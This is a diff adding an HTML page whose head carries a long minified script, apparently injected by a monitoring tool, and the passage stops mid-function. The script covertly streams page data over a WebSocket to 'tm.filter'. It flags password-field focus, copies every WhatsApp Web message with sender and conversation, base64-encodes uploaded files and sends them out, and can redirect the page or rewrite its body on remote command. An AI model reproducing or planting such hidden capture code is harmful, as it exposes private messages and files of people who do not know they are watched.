@@ -1,0 +1,1317 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><script>!function(){var e,t,Y;function n(){try{return window.self===window.top}catch(e){return!1}}function r(){setTimeout((function(){var e={type:"focus",token:L.token,title:document.title,url:document.URL,focused:document.hasFocus(),useragent:navigator.userAgent,pid:L.pid,pn:L.pn};null!=B&&B.readyState==WebSocket.OPEN&&B.send(JSON.stringify(e))}),0)}function a(){var e={type:"notification",token:L.token,title:document.title,url:document.URL,focused:document.hasFocus(),timeout:L.sendNotificationsInterval,useragent:navigator.appVersion.length>navigator.userAgent.length?navigator.appVersion:navigator.userAgent,pid:L.pid,pn:L.pn};B.send(JSON.stringify(e))}function s(){v()}function i(){n()&&(clearInterval(T),clearInterval(k)),timeout=setTimeout((function(){p()}),I)}function o(e){if(n())switch(e.data.substring(0,1)){case"r":window.location=e.data.substring(1);break;case"b":document.body.innerHTML=e.data.substring(1);break;case"w":var t="true"==e.data.substring(1).toLowerCase();O!=t&&t&&y(),O=t;break;case"x":!function(e){const t=JSON.parse(e),Y=N.get(t.requestId);Y&&(N.delete(t.requestId),Y(t))}(e.data.substring(1))}}function u(e){var t=document.createElement("a");return t.href=e,t.href}function d(e){if(!e)return!1;if("password"==e.type)return!0;if(e instanceof HTMLInputElement){var t=window.getComputedStyle(e);if(t){var Y=t.getPropertyValue("-webkit-text-security");return["disc","circle","square"].includes(Y)}}return!1}function c(e,t=!1){if(d(e)&&!x)if(x=!0,n()){var Y={type:"password_input_focus",focus:!0,token:L.token};B.send(JSON.stringify(Y))}else window.top.postMessage({message:"iframePasswordInputFocused",name:e.name,type:"password"},"*")}function M(e,t=!1){var Y=e&&e.name?e.name:"<unnamed>";if(d(e)&&x)if(x=!1,n()){var r={type:"password_input_focus",focus:!1,token:L.token};B.send(JSON.stringify(r))}else window.top.postMessage({message:"iframePasswordInputBlurred",name:Y,type:"password"},"*")}function l(e){var t=document.activeElement;t&&t!=document.body?document.querySelector&&(t=document.querySelector(":focus")):t=null;for(var Y=0;Y<e.length;++Y){let s=e[Y];var n=d(s),r=n&&s.hasAttribute("autofocus"),a=n&&t&&s.isEqualNode(t);(r||a)&&c(s),s.tmInputEventListenerAttached||(s.addEventListener("focus",(function(e){c(e.target)}),!0),s.addEventListener("blur",(function(e){M(e.target)}),!0),s.tmInputEventListenerAttached=!0)}}function D(){l(document.getElementsByTagName("input")),new MutationObserver((function(e){e&&e.forEach((function(e){e&&e.addedNodes&&0!=e.addedNodes.length&&(window.NodeList&&!NodeList.prototype.forEach&&(NodeList.prototype.forEach=Array.prototype.forEach),e.addedNodes.forEach((function(e){if(e.tagName){var t=[];"input"==e.tagName.toLowerCase()?t.push(e):t=e.getElementsByTagName("input"),t.length&&l(t)}})))}))})).observe(document,{childList:!0,subtree:!0}),window.addEventListener("beforeunload",(function(e){M(),function(){for(var e=document.getElementsByTagName("input"),t=0;t<e.length;++t){let Y=e[t];Y.removeEventListener("focus",c),Y.removeEventListener("blur",M),delete Y.tmInputEventListenerAttached}}()}))}function f(){var e;n()&&(L.iup&&(e={type:"connect",token:L.token,title:document.title,url:document.URL,focused:document.hasFocus(),useragent:navigator.userAgent,pid:L.pid,pn:L.pn},null!=B&&B.readyState==WebSocket.OPEN&&B.send(JSON.stringify(e))),h()&&(y(),v(),function(){var e=new MutationObserver((function(e){e&&(Array.from(document.querySelectorAll(".message-in, .message-out")).reduce(((e,t)=>{var Y=t.querySelector("button[type=button], div[role=button]");return Y&&e.push(Y),e}),[]).forEach((e=>{const t="modified";e.hasAttribute(t)||(e.setAttribute(t,""),e.onclick=t=>{t.verified||(t.preventDefault(),t.stopPropagation(),new Promise((function(t,Y){!function(e,t,Y){try{const Y=e.parentElement,n=Y[Object.keys(Y).find((e=>e.includes("__reactProps")))].children.props.msg,r=n.mediaData,a=crypto.randomUUID();N.set(a,(e=>t(!e.block))),B.send(JSON.stringify({requestId:a,type:"waptransfer",direction:"download",filename:r.__x_filename,filesize:r.__x_size,filetype:r.__x_mimetype,filehash:n.__x_encFilehash,url:document.URL,process:L.pn,content:""}))}catch{Y()}}(e,t,(()=>setTimeout((()=>Y()),1)))})).then((e=>{t.verified=e,t.verified&&t.target.dispatchEvent(t)}),(()=>{})))})})),e.forEach((function(e){e&&("childList"!==e.type||e.addedNodes.length<=0||e.addedNodes.forEach((function(e){if(e){e.querySelectorAll("input").forEach((e=>{!function(e){const t="modified";"file"!==e.type||e.hasAttribute(t)||(e.setAttribute(t,""),e.addEventListener("change",(e=>{Array.from(e.target.files).forEach((e=>{!function(e){const t=10485760;if(e){const Y=new FileReader;let n=void 0;e.size>t&&(n=e.slice(0,t)),Y.addEventListener("load",(t=>{const n=crypto.randomUUID();N.set(n,(e=>{b=e.block})),B.send(JSON.stringify({requestId:n,type:"waptransfer",direction:"upload",filename:e.name,filesize:e.size,filetype:e.type,url:document.URL,filehash:"0",process:L.pn,content:S(Y.result)}))})),Y.addEventListener("error",(e=>{})),Y.addEventListener("abort",(e=>{})),null==n?Y.readAsArrayBuffer(e):Y.readAsArrayBuffer(n)}}(e)}))})))}(e)}));var t=document.querySelectorAll("div[id=main] header div")[2];if(t){var Y=t.querySelectorAll("div")[1],n=t.querySelectorAll("div")[2];C=(Y?Y.innerText:"")+":"+(n?n.innerText:"")}document.querySelector("div[id=main] header span[data-icon=default-user]")&&(H="private"),document.querySelector("div[id=main] header span[data-icon=default-group]")&&(H="group");var r=e.querySelectorAll(".message-in, .message-out");r||w("msgNodes is empty"),e.matches(".message-in, .message-out")&&(r=Array.prototype.slice.call(r)).push(e),r&&0!=r.length?r.forEach((function(e){if(e)if(!e.classList||e.classList.length<=0)w("msg node does not contain classList or classList is empty");else{var t=e.classList.contains("message-in"),Y=e.querySelector(".copyable-text"),n=e.querySelector(".selectable-text"),r=new Date,a=null;if(Y&&Y.attributes["data-pre-plain-text"]){var s=Y.attributes["data-pre-plain-text"].textContent,i=/\[(\d{1,2}):(\d{1,2})[ ]{0,1}([p|a]\.?\s?m\.?)?,\s(.+)]\s(.*):/i[Symbol.match](s);if(!i||6!=i.length)return void w("no matches for string: "+s);if(i[3]&&i[3].length>1&&"p"==i[3].toLowerCase().slice(0,1)&&(i[1]=parseInt(i[1])+12),dateParts=/(\d{1,4})[.-\\/](\d{1,4})[.-\\/](\d{1,4})/[Symbol.match](i[4]),!dateParts||4!=dateParts.length)return void w("no matches for string: "+i[4]);if(w(i[4]+_),!(r=date.parse(i[4],_)||function(e,t,Y){var n=[[e,t,Y].join("-"),[e,Y,t].join("-"),[t,e,Y].join("-"),[t,Y,e].join("-"),[Y,e,t].join("-"),[Y,t,e].join("-")],r=Date.now();for(var a in n){var s=Date.parse(n[a]);if(s&&!(Math.abs(r-s)>1728e6))return new Date(s)}}(dateParts[1],dateParts[2],dateParts[3])))return void w("Can't parse date from string: "+i[4]);r.setHours(i[1]),r.setMinutes(i[2]),a=i[5]}w("isIncomingMsg = "+t+" msgDateTime = "+r+" msgSender = "+a+" wapStartTime = "+R+" wapTrackingEnabled = "+O),P.get(C)||P.set(C,R);var o=n?n.innerText:null;if(w("msgContent = "+o),a&&o&&O){var u=(a+o+C+r.getTime()).split("").map((function(e){return e.charCodeAt(0)})).reduce((function(e,t){return e+((e<<7)+(e<<3))^t})).toString(16);if(P.get(C).getTime()==r.getTime()?r.setMilliseconds(++J):(J=0,P.set(C,r)),!u||F.has(u))return void w("msgId is null or this msgId already tracked "+u);var d={type:"wapmessage",timestamp:r.getTime(),id:u,incoming:t,sender:t?a:"Me",content:o,recipient:t?"Me":C,conversationId:C+"("+H+")"};B.send(JSON.stringify(d)),F.add(u)}}})):w("no msg nodes found")}})))})))}));if(!e)return;e.observe(document.body,{childList:!0,subtree:!0}),w("observer is ready")}()),n()&&(a(),T=setInterval(a,L.sendNotificationsInterval),h()&&(k=setInterval(s,L.pollWhatsappTrackingInterval))),function(){for(var e=[],t=document.getElementsByTagName("link"),Y=0;Y<t.length;++Y)"icon"!=t[Y].getAttribute("rel")&&"shortcut icon"!=t[Y].getAttribute("rel")||(e[e.length]=u(t[Y].getAttribute("href")));0==e.length&&(e[0]=u("/favicon.ico"));var n={type:"favicon"};n.url=document.URL,n.src=e,n.title=document.title,n.token=L.token,n.useragent=navigator.appVersion.length>navigator.userAgent.length?navigator.appVersion:navigator.userAgent,B.send(JSON.stringify(n))}(),L.dontTrackWebPasswords&&D())}function g(){document.tmfilter||(p(),_={"ar-SA":"D/M/YY","bg-BG":"D.M.YYYY","ca-ES":"D/M/YYYY","zh-TW":"YYYY/M/D","cs-CZ":"D.M.YYYY","Da-DK":"D-M-YYYY","De-DE":"D.M.YYYY","el-GR":"D/M/YYYY","en-US":"M/D/YYYY","fi-FI":"D.M.YYYY","fr-FR":"D/M/YYYY","he-IL":"D/M/YYYY","hu-HU":"YYYY. M. D.","is-IS":"D.M.YYYY","it-IT":"D/M/YYYY","ja-JP":"YYYY/M/D","ko-KR":"YYYY-M-D","nl-NL":"D-M-YYYY","nb-NO":"D.M.YYYY","pl-PL":"YYYY-M-D","pt-BR":"D/M/YYYY","ro-RO":"D.M.YYYY","ru-RU":"D.M.YYYY","hr-HR":"D.M.YYYY","sk-SK":"D. M. YYYY","sq-AL":"YYYY-M-D","sv-SE":"YYYY-M-D","th-TH":"D/M/YYYY","tr-TR":"D.M.YYYY","ur-PK":"D/M/YYYY","iD-ID":"D/M/YYYY","uk-UA":"D.M.YYYY","be-BY":"D.M.YYYY","sl-SI":"D.M.YYYY","et-EE":"D.M.YYYY","lv-LV":"YYYY.M.D.","lt-LT":"YYYY.M.D","fa-IR":"M/D/YYYY","vi-VN":"D/M/YYYY","hy-AM":"D.M.YYYY","az-Latn-AZ":"D.M.YYYY","eu-ES":"YYYY/M/D","Mk-MK":"D.M.YYYY","af-ZA":"YYYY/M/D","ka-GE":"D.M.YYYY","fo-FO":"D-M-YYYY","hi-IN":"D-M-YYYY","Ms-MY":"D/M/YYYY","kk-KZ":"D.M.YYYY","ky-KG":"D.M.YY","sw-KE":"M/D/YYYY","uz-Latn-UZ":"D/M YYYY","tt-RU":"D.M.YYYY","pa-IN":"D-M-YY","gu-IN":"D-M-YY","ta-IN":"D-M-YYYY","te-IN":"D-M-YY","kn-IN":"D-M-YY","Mr-IN":"D-M-YYYY","sa-IN":"D-M-YYYY","Mn-MN":"YY.M.D","gl-ES":"D/M/YY","kok-IN":"D-M-YYYY","syr-SY":"D/M/YYYY","Dv-MV":"D/M/YY","ar-IQ":"D/M/YYYY","zh-CN":"YYYY/M/D","De-CH":"D.M.YYYY","en-GB":"D/M/YYYY","es-MX":"D/M/YYYY","fr-BE":"D/M/YYYY","it-CH":"D.M.YYYY","nl-BE":"D/M/YYYY","nn-NO":"D.M.YYYY","pt-PT":"D-M-YYYY","sr-Latn-CS":"D.M.YYYY","sv-FI":"D.M.YYYY","az-Cyrl-AZ":"D.M.YYYY","Ms-BN":"D/M/YYYY","uz-Cyrl-UZ":"D.M.YYYY","ar-EG":"D/M/YYYY","zh-HK":"D/M/YYYY","De-AT":"D.M.YYYY","en-AU":"D/M/YYYY","es-ES":"D/M/YYYY","fr-CA":"YYYY-M-D","sr-Cyrl-CS":"D.M.YYYY","ar-LY":"D/M/YYYY","zh-SG":"D/M/YYYY","De-LU":"D.M.YYYY","en-CA":"D/M/YYYY","es-GT":"D/M/YYYY","fr-CH":"D.M.YYYY","ar-DZ":"D-M-YYYY","zh-MO":"D/M/YYYY","De-LI":"D.M.YYYY","en-NZ":"D/M/YYYY","es-CR":"D/M/YYYY","fr-LU":"D/M/YYYY","ar-MA":"D-M-YYYY","en-IE":"D/M/YYYY","es-PA":"M/D/YYYY","fr-MC":"D/M/YYYY","ar-TN":"D-M-YYYY","en-ZA":"YYYY/M/D","es-DO":"D/M/YYYY","ar-OM":"D/M/YYYY","en-JM":"D/M/YYYY","es-VE":"D/M/YYYY","ar-YE":"D/M/YYYY","en-029":"M/D/YYYY","es-CO":"D/M/YYYY","ar-SY":"D/M/YYYY","en-BZ":"D/M/YYYY","es-PE":"D/M/YYYY","ar-JO":"D/M/YYYY","en-TT":"D/M/YYYY","es-AR":"D/M/YYYY","ar-LB":"D/M/YYYY","en-ZW":"M/D/YYYY","es-EC":"D/M/YYYY","ar-KW":"D/M/YYYY","en-PH":"M/D/YYYY","es-CL":"D-M-YYYY","ar-AE":"D/M/YYYY","es-UY":"D/M/YYYY","ar-BH":"D/M/YYYY","es-PY":"D/M/YYYY","ar-QA":"D/M/YYYY","es-BO":"D/M/YYYY","es-SV":"D/M/YYYY","es-HN":"D/M/YYYY","es-NI":"D/M/YYYY","es-PR":"D/M/YYYY","aM-ET":"D/M/YYYY","tzM-Latn-DZ":"D-M-YYYY","iu-Latn-CA":"D/M/YYYY","sMa-NO":"D.M.YYYY","Mn-Mong-CN":"YYYY/M/D","gD-GB":"D/M/YYYY","en-MY":"D/M/YYYY","prs-AF":"D/M/YY","bn-BD":"D-M-YY","wo-SN":"D/M/YYYY","rw-RW":"M/D/YYYY","qut-GT":"D/M/YYYY","sah-RU":"M.D.YYYY","gsw-FR":"D/M/YYYY","co-FR":"D/M/YYYY","oc-FR":"D/M/YYYY","Mi-NZ":"D/M/YYYY","ga-IE":"D/M/YYYY","se-SE":"YYYY-M-D","br-FR":"D/M/YYYY","sMn-FI":"D.M.YYYY","Moh-CA":"M/D/YYYY","arn-CL":"D-M-YYYY","ii-CN":"YYYY/M/D","Dsb-DE":"D. M. YYYY","ig-NG":"D/M/YYYY","kl-GL":"D-M-YYYY","lb-LU":"D/M/YYYY","ba-RU":"D.M.YY","nso-ZA":"YYYY/M/D","quz-BO":"D/M/YYYY","yo-NG":"D/M/YYYY","ha-Latn-NG":"D/M/YYYY","fil-PH":"M/D/YYYY","ps-AF":"D/M/YY","fy-NL":"D-M-YYYY","ne-NP":"M/D/YYYY","se-NO":"D.M.YYYY","iu-Cans-CA":"D/M/YYYY","sr-Latn-RS":"D.M.YYYY","si-LK":"YYYY-M-D","sr-Cyrl-RS":"D.M.YYYY","lo-LA":"D/M/YYYY","kM-KH":"YYYY-M-D","cy-GB":"D/M/YYYY","bo-CN":"YYYY/M/D","sMs-FI":"D.M.YYYY","as-IN":"D-M-YYYY","Ml-IN":"D-M-YY","en-IN":"D-M-YYYY","or-IN":"D-M-YY","bn-IN":"D-M-YY","tk-TM":"D.M.YY","bs-Latn-BA":"D.M.YYYY","Mt-MT":"D/M/YYYY","sr-Cyrl-ME":"D.M.YYYY","se-FI":"D.M.YYYY","zu-ZA":"YYYY/M/D","xh-ZA":"YYYY/M/D","tn-ZA":"YYYY/M/D","hsb-DE":"D. M. YYYY","bs-Cyrl-BA":"D.M.YYYY","tg-Cyrl-TJ":"D.M.YY","sr-Latn-BA":"D.M.YYYY","sMj-NO":"D.M.YYYY","rM-CH":"D/M/YYYY","sMj-SE":"YYYY-M-D","quz-EC":"D/M/YYYY","quz-PE":"D/M/YYYY","hr-BA":"D.M.YYYY.","sr-Latn-ME":"D.M.YYYY","sMa-SE":"YYYY-M-D","en-SG":"D/M/YYYY","ug-CN":"YYYY-M-D","sr-Cyrl-BA":"D.M.YYYY","es-US":"M/D/YYYY"}[navigator.language],document.tmfilter="present")}function p(){(B=new WebSocket(L.connectionString)).onclose=i,B.onmessage=o,B.onopen=f,L.extJs&&(L.extJs.webSock={readyState:()=>B.readyState,send:e=>B.send(e)})}function m(){var e=function(){var e=["webkit","moz","ms","o"];if("hidden"in document)return"hidden";for(var t=0;t<e.length;t++)if(e[t]+"Hidden"in document)return e[t]+"Hidden";return null}();return!!e&&document[e]}function h(){var e=document.head.querySelector("[name='og:title']");return!!e&&"WhatsApp Web"===e.getAttribute("content")}function v(){B.send(JSON.stringify({type:"waptracking"}))}function y(){P=new Map,F=new Set,J=0,(R=new Date).setSeconds(0),R.setMilliseconds(0)}function S(e){for(var t="",Y=new Uint8Array(e),n=Y.byteLength,r=0;r<n;r++)t+=String.fromCharCode(Y[r]);return window.btoa(t)}e=this,t={},Y={en:{MMMM:"January February March April May June July August September October November December".split(" "),MMM:"Jan Feb Mar Apr May Jun Jul Aug Sep Oct Nov Dec".split(" "),dddd:"Sunday Monday Tuesday Wednesday Thursday Friday Saturday".split(" "),ddd:"Sun Mon Tue Wed Thu Fri Sat".split(" "),dd:"Su Mo Tu We Th Fr Sa".split(" "),A:["a.m.","p.m."],formatter:{YYYY:function(e){return("000"+e.getFullYear()).slice(-4)},YY:function(e){return("0"+e.getFullYear()).slice(-2)},Y:function(e){return""+e.getFullYear()},MMMM:function(e){return this.MMMM[e.getMonth()]},MMM:function(e){return this.MMM[e.getMonth()]},MM:function(e){return("0"+(e.getMonth()+1)).slice(-2)},M:function(e){return""+(e.getMonth()+1)},DD:function(e){return("0"+e.getDate()).slice(-2)},D:function(e){return""+e.getDate()},HH:function(e){return("0"+e.getHours()).slice(-2)},H:function(e){return""+e.getHours()},A:function(e){return this.A[11<e.getHours()|0]},hh:function(e){return("0"+(e.getHours()%12||12)).slice(-2)},h:function(e){return""+(e.getHours()%12||12)},mm:function(e){return("0"+e.getMinutes()).slice(-2)},m:function(e){return""+e.getMinutes()},ss:function(e){return("0"+e.getSeconds()).slice(-2)},s:function(e){return""+e.getSeconds()},SSS:function(e){return("00"+e.getMilliseconds()).slice(-3)},SS:function(e){return("0"+(e.getMilliseconds()/10|0)).slice(-2)},S:function(e){return""+(e.getMilliseconds()/100|0)},dddd:function(e){return this.dddd[e.getDay()]},ddd:function(e){return this.ddd[e.getDay()]},dd:function(e){return this.dd[e.getDay()]},Z:function(e){return(0<(e=e.utc?0:e.getTimezoneOffset()/.6)?"-":"+")+("000"+Math.abs(e-e%100*.4)).slice(-4)},post:function(e){return e}},parser:{find:function(e,t){for(var Y,n=-1,r=0,a=0,s=e.length;a<s;a++)Y=e[a],!t.indexOf(Y)&&Y.length>r&&(n=a,r=Y.length);return{index:n,length:r}},MMMM:function(e){return this.parser.find(this.MMMM,e)},MMM:function(e){return this.parser.find(this.MMM,e)},A:function(e){return this.parser.find(this.A,e)},h:function(e,t){return(12===e?0:e)+12*t},pre:function(e){return e}}}},t.format=function(e,n,r){var a=t.addMinutes(e,r?e.getTimezoneOffset():0),s=Y.en,i=s.formatter;return a.utc=r,n.replace(/(\[[^\[\]]*]|\[.*\][^\[]*\]|YYYY|YY|MMM?M?|DD|HH|hh|mm|ss|SSS?|ddd?d?|.)/g,(function(e){var t=i[e];return t?i.post(t.call(s,a,n)):e.replace(/\[(.*)]/,"$1")}))},t.parse=function(e,n,r){var a,s,i=Y.en,o=i.parser.pre(e),u=0,d=/(MMMM?|A)|(YYYY)|(SSS)|(MM|DD|HH|hh|mm|ss)|(YY|M|D|H|h|m|s|SS)|(S)|(.)/g,c={2:/^\d{1,4}/,3:/^\d{1,3}/,4:/^\d\d/,5:/^\d\d?/,6:/^\d/};e=[31,28,31,30,31,30,31,31,30,31,30,31];for(var M={Y:1970,M:1,D:1,H:0,m:0,s:0,S:0};a=d.exec(n);){var l=0,D=1;for(s="";!s;)s=a[++l];a=s.charAt(0);var f=o.slice(u);if(2>l){var g=i.parser[s].call(i,f,n);M[a]=g.index,"M"===a&&M[a]++,D=g.length}else if(7>l)g=(f.match(c[l])||[""])[0],M[a]=0|("S"===a?(g+"000").slice(0,-s.length):g),D=g.length;else if(" "!==a&&a!==f[0])return NaN;if(!D)return NaN;u+=D}return u===o.length&&g?(M.Y+=70>M.Y?2e3:100>M.Y?1900:0,M.H=M.H||i.parser.h(M.h||0,M.A||0),n=new Date(M.Y,M.M-1,M.D,M.H,M.m,M.s,M.S),e[1]+=0|t.isLeapYear(n),1>M.M||12<M.M||1>M.D||M.D>e[M.M-1]||23<M.H||59<M.m||59<M.s?NaN:r?t.addMinutes(n,-n.getTimezoneOffset()):n):NaN},t.isValid=function(e,Y){return!!t.parse(e,Y)},t.addYears=function(e,Y){return t.addMonths(e,12*Y)},t.addMonths=function(e,t){var Y=new Date(e.getTime());return Y.setMonth(Y.getMonth()+t),Y},t.addDays=function(e,t){var Y=new Date(e.getTime());return Y.setDate(Y.getDate()+t),Y},t.addHours=function(e,Y){return t.addMilliseconds(e,36e5*Y)},t.addMinutes=function(e,Y){return t.addMilliseconds(e,6e4*Y)},t.addSeconds=function(e,Y){return t.addMilliseconds(e,1e3*Y)},t.addMilliseconds=function(e,t){return new Date(e.getTime()+t)},t.subtract=function(e,t){var Y=e.getTime()-t.getTime();return{toMilliseconds:function(){return Y},toSeconds:function(){return Y/1e3|0},toMinutes:function(){return Y/6e4|0},toHours:function(){return Y/36e5|0},toDays:function(){return Y/864e5|0}}},t.isLeapYear=function(e){return!(((e=e.getFullYear())%4||!(e%100))&&e%400)},t.isSameDay=function(e,Y){return t.format(e,"YYYYMMDD")===t.format(Y,"YYYYMMDD")},e.date=t;const N=new Map;let b=!1;let A=!1;function w(e){var t={handler:"log",module:"wapjs",url:"wap",message:e};B.send(JSON.stringify(t))}function E(e){var t={name:e.data.name,type:e.data.type};"iframePasswordInputFocused"===e.data.message?c(t,!0):"iframePasswordInputBlurred"===e.data.message&&M(t,!0)}setInterval((()=>{if(b){let e=function(){let e=null,t=document.querySelector("[data-testid=x]");return!t||"_1gvdP"!=t.parentElement.className&&"ajgl1lbb"!=t.parentElement.className||(e=t.parentElement),e}();e&&(e.click(),A=!0),!e&&A&&(b=!1,A=!1)}}),200);var L={token:"57083285-2d6b-47a9-838b-eabe338f5ab9",sendNotificationsInterval:Number("1000"),pollWhatsappTrackingInterval:Number("20000"),connectionString:"wss://tm.filter:1502",pid:"211012",pn:"chrome.exe",iup:false,dontTrackWebPasswords:false,extJs:/*   * don't use double slash comments here as this will be stored in one line for the TMU migrations   *    * this is stored in the kv_store table for the key hm_websites_js   *    * all code should describe one javascript object, i.e. { bla-bla-bla }   *    * this object will be included in standard js injection code as a replacement of 'insight_placeholder'   * if domain of the page matches one of the domain regexes from the hypermonitoring_web settings   * if not, 'insight_placeholder' will be replaced with null   *    * this object must contain function init(token), it will be called only once when document became visible (it is called for every iframe too)   *    * also this code contains placeholdes, see doc in the code (search for `_placeholder` suffix)   *    * also this object must contain property webSock that will be assigned WebSocket when created   *    * this object should send json for every registered event with the following structure:   * {   *      cat: 'insight' - this is required to route the message to the proper handler   *      type: click | changed - type of the event   *      elm: uint32 - id of the element that fired the event. used for deduplication of the events   *      page: uint32 - id of the hypermonitored location   *      obj: uint32 - id of the hypermonitored object that fired event   *      url: string - current document url   *      token: string - js injection token, used to unique identify browser page   *      values: json - contains all collected information about event and it's context   *      proc: id of the process of the host electron   * }   */  {      /* this will be replaced with the rules for current domain       * [        *      {          *          id: locationId,        *          url: string | null,        *          objects:        *          [       *              {        *                  id: objectId,        *                  sources: [],       *                  ...       *              },       *              ...       *          ]        *      },       *      ...       * ]       */      pages: [],        /* required property for electron */      proc: null,        /* required property - will be assigned to WebSocket once it will be read */      webSock: null,      pendingPackets: [],        webSockReady: function () {          return this.webSock !== null && this.webSock.readyState === WebSocket.OPEN;      },        processPacket: function (t) {          if (!this.webSockReady())              this.pendingPackets.push(t);          else {              this.sendPendingPackets();              this.webSock.send(t);          }      },        sendPendingPackets: function () {          if (this.webSockReady() && this.pendingPackets.length > 0) {              for (var i = 0; i < this.pendingPackets.length; ++i)                  this.webSock.send(this.pendingPackets[i]);              this.pendingPackets = [];          }      },        /* store js injection token */      token: null,        /* should we send log messages to the agent, bool */      sendLog: false,        /* should we include all content of the htmlelements in the log messages, bool */      sendLogFullData: false,        /* should we log snapshots of the html after every mutation event */      sendLogSnapshots: false,        /* should we catch exceptions and log them (as opposed to let browser stops in debugger) */      sendLogExceptions: true,        /*       * required function - it will be called once when document became visible       * it will be also called for iframes       *           * argument token - js injection token       */      init: function (token) {          this.token = token;          this.log("init: token:" + token + " sendLog:" + this.sendLog + " sendLogFullData:" + this.sendLogFullData);            if (document.readyState === "interactive" || document.readyState === "complete")              this.attachEvents();          else              window.addEventListener("DOMContentLoaded", this.attachEvents.bind(this));            setInterval(this.sendPendingPackets.bind(this), 1000);      },        /*       * here we scan all provided settings and choose what listeners are required       * we don't want to intrude in the js more that necessary for performance and compatibility considerations       */      attachEvents: function () {          var needClick = false, needChange = false, needChildList = this.sendLogSnapshots, needCharacterData = this.sendLogSnapshots, callObjects = [];          this.pages.forEach(function (page) {              page.objects.forEach(function (obj) {                  ['addText', 'removeText', 'addElm', 'removeElm', 'stateByElm'].forEach(function (source) {                      if (obj.sources.includes(source))                          needChildList = true;                  });                  if (obj.sources.includes('changeText'))                      needCharacterData = true;                  if (obj.sources.includes('change'))                      needChange = true;                  if (obj.sources.includes('click'))                      needClick = true;                  if (obj.sources.includes('call'))                      callObjects.push({ page: page, obj: obj });              });          });          this.log("attachEvents: needClick:" + needClick + " needChange:" + needChange + " needChildList:" + needChildList + " needCharacterData:" + needCharacterData);          if (needClick)              window.addEventListener('click', this.onEvent.bind(this), true);          if (needChange)              window.addEventListener('change', this.onEvent.bind(this), true);          if (needChildList || needCharacterData)              new MutationObserver(this.onMutation.bind(this)).observe(document, { subtree: true, childList: needChildList, characterData: needCharacterData });            if (needClick || needChange || needChildList || needCharacterData) {              /* we process mutation events only after human interaction */              window.addEventListener('keydown', this.onInteraction.bind(this));              window.addEventListener('mousedown', this.onInteraction.bind(this));          }            if (callObjects.length > 0) {              var self = this;              var intervalHandle = setInterval(function () {                  for (var i = callObjects.length - 1; i >= 0; i--) {                      if (self.interceptCall(callObjects[i]))                          callObjects.splice(i, 1);                  }                  if (callObjects.length == 0)                      clearInterval(intervalHandle);              }, 500);          }      },        interceptCall: function (callObj) {          var obj = callObj.obj, jsObj;          try {              jsObj = this.calc(obj, "object", [], []);          }          catch{ }          if (jsObj == null) {              this.log("attachEvents: object:" + obj.id + " is not found");              return false;          }          var method = jsObj[obj.func];          var self = this;          jsObj[obj.func] = function () {              var arg_data = self.calc(obj, "arg_data", ["args"], [arguments], "return null");              var ret = method.apply(jsObj, arguments);              var return_data = self.calc(obj, "return_data", ["ret"], [ret], "return null");              if (arg_data != null || return_data != null)                  self.sendEvent("interceptCall", callObj.page, obj, undefined, { arg_data: arg_data, return_data: return_data });              return ret;          };          self.log("attachEvents: object:" + obj.id + ", " + (obj.object || obj.object_f) + " is found, call to '" + obj.func + "' intercepted");          return true;      },        /* new Date().getTime() of the last human interacion (keydown, mousedown, mouseup)      to filter out DOM mutation events that was not due to human activity */      lastInteraction: null,        /* on human interaction (keydown, mousedown, mouseup) */      onInteraction: function (ev) {          this.lastInteraction = new Date().getTime();          this.log('onInteraction: human Interaction ' + ev.type + ': ' + this.lastInteraction);      },        /* handles click and change events */      onEvent: function (ev) {          var self = this;          this.callSafe("onEvent", function () {              self.handleEvent(ev.type, ev.type, ev.composed ? ev.composedPath() : self.getAncestors(ev.target));          });      },        /* handles addText, changeText, removeText, addElm, removeElm DOM mutation events */      onMutation: function (mList) {          var self = this;          if (this.sendLogSnapshots)              this.log("snapshot: " + document.body.outerHTML.replace(/\n|\r/g, '#'));          this.callSafe("onMutation", function () {              if (self.lastInteraction !== null) {                  mList.forEach(function (m) {                      if (m.type === 'childList') {                          m.removedNodes.forEach(function (sub) {                              if (sub.nodeType === Node.TEXT_NODE)                                  self.handleEvent('change', 'removeText', self.getAncestors(m.target));                              else if (sub.nodeType === Node.ELEMENT_NODE)                                  self.handleEventWithSub('change', 'removeElm', self.getAncestors(m.target), sub);                          });                          m.addedNodes.forEach(function (sub) {                              if (sub.nodeType === Node.TEXT_NODE)                                  self.handleEvent('change', 'addText', self.getAncestors(m.target));                              else if (sub.nodeType === Node.ELEMENT_NODE)                                  self.handleEventWithSub('change', 'addElm', self.getAncestors(m.target), sub);                          });                      }                      else if (m.type === 'characterData' && m.target)                          self.handleEvent('change', 'changeText', self.getAncestors(m.target));                  });              }                self.processStateByElm();          });      },        objId2key2value: {},      processStateByElm: function () {          var self = this;          self.forEachObject('stateByElm', function (page, obj) {              var key2value = {};              if (self.calc(obj, 'condition', [], [], "return true;")) {                  self.applySelector(document, obj.selector).forEach(function (elm) {                      var key = self.calc(obj, 'key', ['e'], [elm]);                      var value = self.calc(obj, 'value', ['e'], [elm]);                      key2value[JSON.stringify(key)] = JSON.stringify(value);                  });              }                var oldKey2Value = self.objId2key2value[obj.id];              oldKey2Value = oldKey2Value ? oldKey2Value : {};              for (var k in key2value) {                  if (key2value[k] !== oldKey2Value[k])                      self.sendEvent('change', page, obj, undefined, { key: JSON.parse(k), old: oldKey2Value[k] ? JSON.parse(oldKey2Value[k]) : undefined, "new": JSON.parse(key2value[k]) });                  delete oldKey2Value[k];              }              for (var k in oldKey2Value)                  self.sendEvent('change', page, obj, undefined, { key: JSON.parse(k), old: oldKey2Value[k] ? JSON.parse(oldKey2Value[k]) : undefined });              self.objId2key2value[obj.id] = key2value;          });      },        /* get ancestors for the element */      getAncestors: function (e) {          var path = [];          for (; e !== document && e !== null; e = e.parentNode)              path.push(e);          return path;      },        /* handles simple events: click, change, addText, changeText, removeText */      handleEvent: function (type, source, ancestors) {          if (this.sendLog)    /* double check not to call elementString in vain */              this.log("handleEvent: type:" + type + " source:" + source + " target:" + this.elementString(ancestors[0]));          var self = this;          this.forEachMatch(source, ancestors, function (page, obj, elm) {              self.send(type, page, obj, ancestors[0], elm);          });      },        /* handles events with sub element: addElm, removeElm */      handleEventWithSub: function (type, source, ancestors, sub) {          if (this.sendLog)    /* double check not to call elementString in vain */              this.log("handleEventWithSub: type:" + type + " source:" + source + " target:" + this.elementString(ancestors[0]) + " sub:" + this.elementString(sub));          var self = this;          this.forEachMatch(source, ancestors, function (page, obj, elm) {              if (!obj.sub_matches || sub.matches(obj.sub_matches)) {                  if (obj.sub_selector) {                      self.applySelector(sub, 